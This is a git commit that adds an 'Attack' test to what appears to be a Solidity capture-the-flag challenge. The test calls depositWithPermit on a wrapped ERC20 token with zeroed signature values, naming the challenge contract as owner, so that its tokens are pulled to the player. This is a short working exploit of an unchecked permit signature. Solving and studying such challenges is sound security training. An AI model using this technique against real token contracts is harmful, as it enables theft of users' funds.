6762071b4b925a058ac28d9369c7baf5fa7ca728
mositori <destrage1958@gmail.com>
2022-05-21 20:25:03 +0900

    WrappedERC20Challenge

--- test/WrappedERC20Challenge.test.ts
+++ test/WrappedERC20Challenge.test.ts
@@ -3,6 +3,7 @@ import { expect } from 'chai'
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
 import { WrappedERC20, WrappedERC20Challenge } from '../typechain-types'
 import { toWei } from './helpers/utils'
+import { formatBytes32String } from 'ethers/lib/utils'
 
 describe('WrappedERC20Challenge', async function () {
   let player: SignerWithAddress
@@ -18,6 +19,20 @@ describe('WrappedERC20Challenge', async function () {
   })
 
   it('Attack', async function () {
+    const wwEth = (await ethers.getContractAt(
+      'WrappedERC20',
+      await challenge.wwETH()
+    )) as WrappedERC20
+
+    await wwEth.depositWithPermit(
+      challenge.address,
+      toWei('5'),
+      0,
+      0,
+      formatBytes32String("0x00"),
+      formatBytes32String("0x00"),
+      player.address
+    )
     expect(await challenge.isSolved()).to.be.true
   })
 })
